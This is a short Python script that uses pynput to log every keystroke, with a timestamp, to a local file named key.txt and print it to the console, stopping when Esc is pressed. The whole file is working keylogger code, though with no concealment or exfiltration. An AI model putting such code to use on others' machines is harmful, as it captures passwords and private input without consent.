import pynput
from pynput.keyboard import Key, Listener
import datetime

log_file='key.txt'

def on_prss(k):
    try:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.datetime.now()} {k.char}\n")
        print(f"key pressed: {k.char}")
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f"{datetime.datetime.now()} {k}\n")
        print(f" Special key pressed: {k}")
        
def on_release(k):
    if k== Key.esc:
        print("Esc key pressed")
        return False
    
with Listener(on_press=on_prss, on_release=on_release) as listener:
    listener.join()